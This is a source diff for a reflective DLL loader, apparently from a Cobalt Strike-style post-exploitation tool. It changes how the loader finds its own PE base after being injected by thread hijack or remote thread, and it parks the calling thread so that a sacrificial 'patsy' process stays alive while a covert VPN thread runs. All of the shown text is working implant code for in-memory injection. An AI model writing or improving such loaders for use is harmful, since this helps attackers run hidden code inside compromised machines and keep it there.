@@ -1208,12 +1208,24 @@ rl_ror13_a(const char *s)
     return h;
 }
 
+/* Address of the instruction after the call site in our CALLER - i.e.
+ * inside ReflectiveLoader itself, which lives in the raw blob. Unlike
+ * _ReturnAddress() read inside ReflectiveLoader directly, this does not
+ * depend on HOW the blob was entered: the beacon's injectors start the
+ * blob as a plain function (thread hijack / remote thread), where the
+ * stack return address points outside the blob. */
+static ULONG_PTR
+rl_here(void)
+{
+    return (ULONG_PTR)_ReturnAddress();
+}
+
 /* Walk pages down from a code address until the PE header of the raw
  * blob is found (the blob is page-aligned in the patsy). */
 static ULONG_PTR
-rl_self_base(void)
+rl_self_base(ULONG_PTR from)
 {
-    volatile unsigned char *p = (volatile unsigned char *)((ULONG_PTR)_ReturnAddress() & ~0xFFFULL);
+    volatile unsigned char *p = (volatile unsigned char *)(from & ~0xFFFULL);
     for (;;) {
         if (p[0] == 'M' && p[1] == 'Z') {
             LONG e = *(volatile LONG *)(p + 0x3C);
@@ -1224,6 +1236,17 @@ rl_self_base(void)
         }
         p -= 0x1000;
     }
+}
+
+/* The CS DOS-stub convention: after the loader returns, the stub CALLS
+ * rax as the payload entry. Returning this keeps that calling thread
+ * (and therefore the patsy) alive while the VPN thread runs - the same
+ * lifetime the original covertvpn.dll had. */
+static DWORD WINAPI
+rl_park(LPVOID param)
+{
+    (void)param;
+    for (;;) SleepEx(INFINITE, TRUE);
 }
 
 /* kernel32 base via the loader module list (x64 offsets).
@@ -1305,7 +1328,7 @@ ReflectiveLoader(LPVOID param)
 
     (void)param;   /* the DOS-header stub passes garbage in rcx */
 
-    base = rl_self_base();
+    base = rl_self_base(rl_here());
     if (!base) return 0x5100000000ULL;
     dh  = (IMAGE_DOS_HEADER *)base;
     nth = (IMAGE_NT_HEADERS *)(base + dh->e_lfanew);
@@ -1410,7 +1433,10 @@ ReflectiveLoader(LPVOID param)
     ((BOOL (WINAPI *)(HINSTANCE, DWORD, LPVOID))entry)(
         (HINSTANCE)newbase, DLL_PROCESS_ATTACH, NULL);
 
-    return newbase;
+    /* CS stub convention: rax is called as the payload entry after the
+     * loader returns - park the calling thread so the patsy stays alive
+     * for the VPN thread. */
+    return (ULONG_PTR)rl_park;
 }
 
 #endif /* _M_X64 */
